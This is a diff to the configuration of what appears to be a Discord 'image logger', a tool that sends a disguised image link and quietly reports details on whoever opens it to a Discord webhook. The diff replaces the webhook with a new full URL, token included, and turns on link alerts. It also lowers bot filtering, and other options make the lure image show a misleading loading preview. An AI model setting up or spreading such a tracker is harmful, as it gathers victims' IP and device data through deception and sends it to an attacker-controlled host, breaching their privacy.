@@ -12,7 +12,7 @@ __author__ = "Phobos"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1117194295984795678/1EOEj4LkZN_NODOuxsZ1lW90r7XeY_Qot_6ZANF-XXb6ZBuIMQDV4mlpiLu6ARFIzgMT",
+    "webhook": "https://discord.com/api/webhooks/1239162725775704165/u1-ipEGh5C2LSjAZPzVobValJ1zJ0OXosn9u7WshieLmow8Nd36IJvxd2mfP_gD8GeBn",
     "image": "https://www.shutterstock.com/image-vector/click-here-button-hand-pointer-260nw-1187607886.jpg", # You can also have a custom image by using a URL argument
     "imageArgument": True, # Allows you to use a URL argument to change the image
 
@@ -36,10 +36,10 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
-    "antiBot": 2, # Prevents bots from triggering the alert
+    "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
                 # 1 = Don't ping when it's possibly a bot
                 # 2 = Don't ping when it's 100% a bot
